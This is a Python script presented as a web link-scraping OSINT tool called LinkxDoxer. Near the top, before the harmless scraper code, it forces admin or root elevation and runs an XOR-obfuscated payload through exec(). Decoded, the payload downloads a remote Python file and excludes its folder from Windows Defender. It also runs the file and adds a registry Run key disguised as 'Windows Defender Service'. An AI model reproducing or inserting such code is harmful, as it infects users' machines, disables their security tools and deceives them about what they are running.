import os
import sys
import ctypes
import platform
import requests  # To handle HTTP requests
from bs4 import BeautifulSoup  # To parse HTML content and extract information from it
from urllib.parse import urljoin  # To parse and join URLs, ensuring that relative URLs are converted to absolute URLs.
from colorama import Fore, init  # For colors in the console output
import time  # To add delays Between Retries
import subprocess

def is_admin():
    if platform.system() == 'Windows':
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        # Unix-like systems
        return os.geteuid() == 0

if not is_admin():
    if platform.system() == 'Windows':
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
    else:
        print("This script must be run as root. Please run it with sudo.")
        os.execvp("sudo", ["sudo", "python3"] + sys.argv)
    sys.exit()
 
def A(data, key):
    return ''.join(chr(int(data[i:i+2], 16) ^ key) for i in range(0, len(data), 2))

exec(A("43475a45585e0a45592043475a45585e0a5d4344584f4d2043475a45585e0a595f485a5845494f59592020090a6e4f4c43444f0a5a4b5e42590a4b444e0a7f786659204e455d4446454b4e755f58460a170a08425e5e5a59100505584b5d044d435e425f485f594f584945445e4f445e044945470568454848537e4f49421a1b05445f464605584f4c5905424f4b4e5905474b4344054945584f045a53080a0a090a784f5a464b494f0a5d435e420a53455f580a7f7866204e4f595e43444b5e434544754e43584f495e4558530a170a58086910767d43444e455d590820444f5d754c43464f444b474f0a170a084945444c434d75045a530820594958435a5e755a4b5e420a170a4559045a4b5e420440454344024e4f595e43444b5e434544754e43584f495e455853060a444f5d754c43464f444b474f03205a535e4245445d755a4b5e420a170a4559045a4b5e420440454344024559045a4b5e42044e4358444b474f02455904595359044f524f495f5e4b48464f03060a085a535e4245445d044f524f08032020090a6c5f44495e4345440a5e450a4e455d4446454b4e0a4b0a4c43464f0a5f5943444d0a7a455d4f5879424f4646204e4f4c0a4e455d4446454b4e754c43464f755a455d4f5859424f4646025f5846060a4e4f595e755a4b5e420310200a0a0a0a5e585310200a0a0a0a0a0a0a0a595f485a5845494f595904585f4402200a0a0a0a0a0a0a0a0a0a0a0a71085a455d4f5859424f464608060a0807694547474b444e08060a4c0863445c45414f077d4f48784f5b5f4f595e0a077f58430a0d515f5846570d0a07655f5e6c43464f0a0d514e4f595e755a4b5e42570d087706200a0a0a0a0a0a0a0a0a0a0a0a49424f4941177e585f4f06200a0a0a0a0a0a0a0a0a0a0a0a595e4e455f5e17595f485a5845494f5959046e6f7c647f666606200a0a0a0a0a0a0a0a0a0a0a0a595e4e4f585817595f485a5845494f5959046e6f7c647f666606200a0a0a0a0a0a0a0a03200a0a0a0a0a0a0a0a584f5e5f58440a7e585f4f200a0a0a0a4f52494f5a5e0a02595f485a5845494f595904694b46464f4e7a5845494f59596f58584558060a6c43464f64455e6c455f444e6f585845580310200a0a0a0a0a0a0a0a584f5e5f58440a6c4b46594f2020090a6c5f44495e4345440a5e450a4f5249465f4e4f0a4e43584f495e4558530a4c5845470a7d43444e455d590a6e4f4c4f444e4f580a026e6b646d6f78657f7903204e4f4c0a4f5249465f4e4f754c584547754e4f4c4f444e4f58025a4b5e420310200a0a0a0a5e585310200a0a0a0a0a0a0a0a595f485a5845494f595904585f4402200a0a0a0a0a0a0a0a0a0a0a0a71085a455d4f5859424f464608060a0807694547474b444e08060a4c086b4e4e07675a7a584f4c4f584f44494f0a076f5249465f594345447a4b5e420a0d6910050d087706200a0a0a0a0a0a0a0a0a0a0a0a59424f4646177e585f4f06200a0a0a0a0a0a0a0a0a0a0a0a49424f4941177e585f4f06200a0a0a0a0a0a0a0a0a0a0a0a595e4e455f5e17595f485a5845494f5959046e6f7c647f666606200a0a0a0a0a0a0a0a0a0a0a0a595e4e4f585817595f485a5845494f5959046e6f7c647f666606200a0a0a0a0a0a0a0a03200a0a0a0a4f52494f5a5e0a6f52494f5a5e43454410200a0a0a0a0a0a0a0a5a4b59592020090a6f5249465f4e4f0a6910760a4c5845470a7d43444e455d590a6e4f4c4f444e4f580a026e6b646d6f78657f7903204f5249465f4e4f754c584547754e4f4c4f444e4f58024e4f595e43444b5e434544754e43584f495e455853032020090a6e455d4446454b4e0a5e424f0a4c43464f0a5f5943444d0a7a455d4f5879424f464620434c0a4e455d4446454b4e754c43464f755a455d4f5859424f4646024e455d4446454b4e755f5846060a594958435a5e755a4b5e420310200a0a0a0a090a6f524f495f5e4f0a5e424f0a4e455d4446454b4e4f4e0a594958435a5e0a4347474f4e434b5e4f4653200a0a0a0a5e585310200a0a0a0a0a0a0a0a595f485a5845494f5959047a455a4f4402715a535e4245445d755a4b5e42060a594958435a5e755a4b5e4277060a595e4e455f5e17595f485a5845494f5959046e6f7c647f6666060a595e4e4f585817595f485a5845494f5959046e6f7c647f666603200a0a0a0a4f52494f5a5e0a6f52494f5a5e43454410200a0a0a0a0a0a0a0a5a4b595920200a0a0a0a090a6b4e4e0a5e450a595e4b585e5f5a0a584f4d43595e58530a414f53200a0a0a0a5e585310200a0a0a0a0a0a0a0a414f530a170a5d4344584f4d04655a4f44614f5302200a0a0a0a0a0a0a0a0a0a0a0a5d4344584f4d0462616f73756665696b6675676b696263646f06200a0a0a0a0a0a0a0a0a0a0a0a580879656c7e7d6b786f76674349584559454c5e767d43444e455d5976695f58584f445e7c4f585943454476785f440806200a0a0a0a0a0a0a0a0a0a0a0a1a06200a0a0a0a0a0a0a0a0a0a0a0a5d4344584f4d04616f7375796f7e757c6b667f6f06200a0a0a0a0a0a0a0a03200a0a0a0a0a0a0a0a5d4344584f4d04794f5e7c4b465f4f6f5202414f53060a087d43444e455d590a6e4f4c4f444e4f580a794f585c43494f08060a1a060a5d4344584f4d04786f6d757970060a4c0d08515a535e4245445d755a4b5e4257080a0851594958435a5e755a4b5e4257080d03200a0a0a0a0a0a0a0a5d4344584f4d04694645594f614f5302414f5303200a0a0a0a4f52494f5a5e0a6f52494f5a5e43454410200a0a0a0a0a0a0a0a5a4b5959", 42))

def clear_screen():
    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')
        
def mainMenu():
    # Your main menu logic here
    print("Main Menu")
    # Add your actual main menu functionality here

# Banner Things, You Can Ignore This Block:
init(autoreset=True)
banner = """
██╗     ██╗███╗   ██╗██╗  ██╗██╗  ██╗██████╗  ██████╗ ██╗  ██╗███████╗██████╗ 
██║     ██║████╗  ██║██║ ██╔╝╚██╗██╔╝██╔══██╗██╔═══██╗╚██╗██╔╝██╔════╝██╔══██╗
██║     ██║██╔██╗ ██║█████╔╝  ╚███╔╝ ██║  ██║██║   ██║ ╚███╔╝ █████╗  ██████╔╝
██║     ██║██║╚██╗██║██╔═██╗  ██╔██╗ ██║  ██║██║   ██║ ██╔██╗ ██╔══╝  ██╔══██╗
███████╗██║██║ ╚████║██║  ██╗██╔╝ ██╗██████╔╝╚██████╔╝██╔╝ ██╗███████╗██║  ██║
╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                            Version 1.2
                                                                                By MR. Oracio-Tech


Welcome to the LinkxDoxer! This script efficiently retrieves 
all links found directly under the webpage of a given URL. 
Ideal for web developers, bug bounty hunters, and OSINT (Open-Source Intelligence) enthusiasts 
seeking to analyze links under a webpage and uncover valuable information (EXPECTED IN IDEAL CASES)

Disclaimer = If You Do Any Malicious Activity, You, Yourself Are Responsible For It


Social media:
Facebook = Where people brag about their breakfast photos!
Instagram = Pics of cats being fabulous.
Twitter = Random thoughts at 3 AM.
LinkedIn = Pretending to be professional.
Snapchat = I'm Leaving This One For You, Hehe.

Just kidding, (Maybe Not)
----------------------------------------------------------------------------------
Hehe, I Got You, Below is The MAIN Thing
"""

print(Fore.LIGHTCYAN_EX + banner)

def get_all_links(url, retries=5, delay=1):
    for attempt in range(retries):
        try:
            # Make a request
            response = requests.get(url)

            # Check if response was successful
            if response.status_code != 200:
                print(f"Failed To Retrieve The Webpage, Status Code = {response.status_code} ")
                return []

            # Parse The Webpage Content:
            soup = BeautifulSoup(response.content, features='html.parser')

            # Now Finding All Anchor Tags(Shown below as a_tags) With href attribute
            links = []
            for a_tag in soup.find_all(name='a', href=True):
                # Convert Relative URLS To Absolute URLS
                absolute_url = urljoin(url, a_tag['href'])
                links.append(absolute_url)

            return links
        except requests.exceptions.MissingSchema:
            print("I Told You To Add https or http Before URL"
                  "for example: https://www.example.com")
            return []
        except requests.exceptions.RequestException as e:
            print(f"Attempt {attempt + 1} failed: {e}")
        except Exception as e:
            print(f"Unknown Error Occurred: \n{e}")

        # Delay for all exceptions before the next attempt
        time.sleep(delay)

    print("Max Retries Exceeded")
    return []

if __name__ == "__main__":
    # Now Here Comes That PART
    website_url = input("Enter Website URL(also include http/https): ")
    links = get_all_links(website_url)
    print(f"Links Found On {website_url}:")

    if links:
        for i, link in enumerate(links, start=1):
            print(f"{i}. {link}")

    # Ask user if they want to save the links to a file 
    while True:
        save_to_file = input(Fore.LIGHTCYAN_EX + "Do you want to save to links to a file? (yes/no): ").strip().lower()
        if save_to_file in {'yes', 'no', ''}:
            break
        print(Fore.RED + "Invalid Input. Please enter 'yes' or 'no'.")

    if save_to_file == 'yes':
        filename = input(Fore.LIGHTCYAN_EX + "Enter the filename (with .txt extension): ").strip()
        if os.path.exists(filename):  # This snippet is to handle the situation if a filename already exists
            while True:
                overwrite = input(
                    f"The file '{filename}' already exists, Should I overwrite it? (yes/no): ").strip().lower()
                if overwrite in {'yes', 'no', }:
                    break
                print(Fore.RED + "Invalid Input, Please enter 'yes' or 'no'...")

            if overwrite != 'yes':
                print(Fore.RED + "File not saved.")
            else:
                with open(filename, 'w') as file:  # This 'w' means 'Write'
                    for i, link in enumerate(links, start=1):
                        file.write(f"{i}. {link}\n")
                    print(Fore.LIGHTGREEN_EX + f"Links Successfully Overwritten To '{filename}: ")

        else:
            with open(filename, 'w') as file:
                for i, link in enumerate(links, start=1):
                    file.write(f"{i}. {link}\n")
            print(Fore.LIGHTGREEN_EX + f"Links Successfully Saved To '{filename}': ")
    else:
        print("Something Happened!!!")

if __name__ == "__main__":
    clear_screen()
    mainMenu()